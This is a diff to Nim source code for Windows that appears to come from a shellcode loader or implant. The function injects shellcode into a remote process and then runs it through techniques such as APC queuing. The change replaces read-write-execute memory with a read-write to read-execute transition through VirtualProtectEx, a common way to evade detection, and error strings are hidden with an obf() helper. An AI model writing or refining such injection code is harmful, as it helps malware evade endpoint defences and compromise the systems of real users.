@@ -103,7 +103,7 @@ when defined(windows):
   proc injectAndResume(pi: PROCESS_INFORMATION, shellcode: seq[byte],
                        technique: string): tuple[success: bool, error: string] =
     let pRemote = VirtualAllocEx(pi.hProcess, nil, SIZE_T(shellcode.len),
-                                  MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+                                  MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
     if pRemote == nil:
       discard TerminateProcess(pi.hProcess, 0)
       CloseHandle(pi.hProcess)
@@ -117,6 +117,15 @@ when defined(windows):
       CloseHandle(pi.hProcess)
       CloseHandle(pi.hThread)
       return (false, obf("WriteProcessMemory failed: ") & $GetLastError())
+    
+    # Transition RW -> RX (no RWX pages)
+    var oldProtect: DWORD
+    if VirtualProtectEx(pi.hProcess, pRemote, SIZE_T(shellcode.len),
+                        PAGE_EXECUTE_READ, addr oldProtect) == 0:
+      discard TerminateProcess(pi.hProcess, 0)
+      CloseHandle(pi.hProcess)
+      CloseHandle(pi.hThread)
+      return (false, obf("VirtualProtectEx failed: ") & $GetLastError())
     
     case technique.toLower()
     of obf("apc"):
